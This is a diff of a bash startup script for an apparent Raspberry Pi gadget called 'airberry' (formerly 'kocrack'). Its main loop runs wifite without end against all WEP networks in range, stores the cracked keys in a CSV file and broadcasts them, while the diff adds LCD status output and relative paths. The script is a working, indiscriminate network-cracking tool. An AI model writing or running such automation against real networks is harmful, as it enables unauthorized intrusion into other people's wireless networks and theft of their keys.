@@ -1,24 +1,27 @@
 #!/usr/bin/env bash
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/bin
+export HERE=$(cd $(dirname "$0") ; pwd)
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/bin:$HERE
 export HOME=/root
-(/root/kocrack/airberry_logo.py ; sleep 60 ; /root/kocrack/welcome.py ) &
+$HERE/lcd.py backlight 0
+$HERE/airberry_logo.py ; sleep 3
 IFACE=wlan0
 if  ! ifconfig -a $IFACE >/dev/null 
 then
 	echo "$IFACE not found"
+	$HERE/lcd.py text 0 0 "No wireless,  nothing to    crack"
+	(sleep  10 ; [ -n "$(hostname -I)" ] && $HERE/lcd.py text 0 0 $(hostname -I)) &
 	exit 1
 fi
 echo $$ > /var/run/$(basename "$0").pid
 cd $HOME
-mkfifo /var/run/kocrack
-nohup $HOME/kocrack/check-fs-space.sh /tmp &
+mkfifo /var/run/airberry
+nohup $HERE/check-fs-space.sh /tmp &
 #airmon-ng start wlan0
 # Sort according to essid
-sort -u -t ',' -k 3 $HOME/cracked.csv $HOME/kocrack/cracked.csv > /tmp/c
-mv /tmp/c $HOME/kocrack/cracked.csv
-rm -f $HOME/cracked.csv
+sort -u -t ',' -k 3 $HOME/cracked.csv $HERE/cracked.csv > /tmp/c
+mv /tmp/c $HERE/cracked.csv && rm -f $HOME/cracked.csv
 while true
 do
-	$HOME/bin/wifite.py --wep -1 --all --scan-time 60 --power 15 >>/tmp/wifite.log
-	$HOME/kocrack/broadcast-keys >> /tmp/wifite.log
+	$HOME/bin/wifite.py --wep -1 --all --scan-time 60 --power 15 --lcd >>/tmp/wifite.log
+	$HERE/broadcast-keys >> /tmp/wifite.log
 done
